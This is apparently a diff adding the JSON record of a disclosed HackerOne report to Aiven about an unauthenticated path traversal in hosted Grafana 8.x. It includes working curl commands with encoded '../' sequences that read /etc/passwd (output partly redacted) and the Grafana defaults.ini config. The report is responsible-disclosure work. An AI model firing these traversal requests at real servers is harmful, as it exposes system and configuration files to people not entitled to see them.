@@ -1,0 +1,136 @@
+{
+  "id": 1415820,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDE1ODIw",
+  "url": "https://hackerone.com/reports/1415820",
+  "title": "Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-12-02T20:56:34.870Z",
+  "submitted_at": "2021-12-02T20:56:34.934Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "j0v",
+    "url": "/j0v",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 45650,
+    "url": "https://hackerone.com/aiven_ltd",
+    "handle": "aiven_ltd",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4dvu0xq9iacojs2s7fgkd3pbu87f/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4dvu0xq9iacojs2s7fgkd3pbu87f/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Aiven Ltd",
+      "twitter_handle": "",
+      "website": "https://aiven.io",
+      "about": "Fully-managed and hosted database and messaging services on all major clouds in dozens of regions worldwide."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-12-14T10:59:00.381Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-12-14T10:58:39.313Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nHi team,\n\nI've found a path traversal issue in the Grafana instances hosted on the Aiven platforms. With the path traversal it's possible for an unauthenticated user to read arbitrary files on the server.\n\n## Steps To Reproduce:\n\n  1. Login at https://console.aiven.io\n  1. Create a new Grafana instance and wait till it's up and running\n  1.Run the following curl command to get the content of the /etc/passwd file on the server:\n```\ncurl https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n```\n\nOutput:\n```\n$ curl https://grafana-303ca6f8-███████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\n███\n█████\n██████\n██████████\n██████████\n████████\n██████\nsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\nsystemd-coredump:x:992:991:systemd Core Dumper:/:/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin\nsystemd-timesync:x:991:990:systemd Time Synchronization:/:/sbin/nologin\n██████████\ndbus:x:81:81:System message bus:/:/sbin/nologin\n█████\n████████\n██████\n█████████\n██████████\n███\n██████████\n███\n█████\n█████████\n██████████\n███\n███\n████\n███\n```\n\nSome other examples:\n\nSee the Grafana config:\n```\ncurl --path-as-is https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini\n```\n\nI'll keep my Grafana instance running so you can try to reproduce it with the examples above.\n\n## Impact\n\nAn unauthenticated user can get access to all system files if he knows the exact path of the file.",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 104,
+  "voters": [
+    "p4n7h3rx",
+    "patrick666",
+    "m4khn0",
+    "n1m0",
+    "drsniper",
+    "ola0",
+    "mrmax4o4",
+    "youstin",
+    "alp",
+    "fdeleite",
+    "and 94 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 69451,
+    "asset_type": "OTHER",
+    "asset_identifier": "Aiven for Grafana managed and hosted service",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
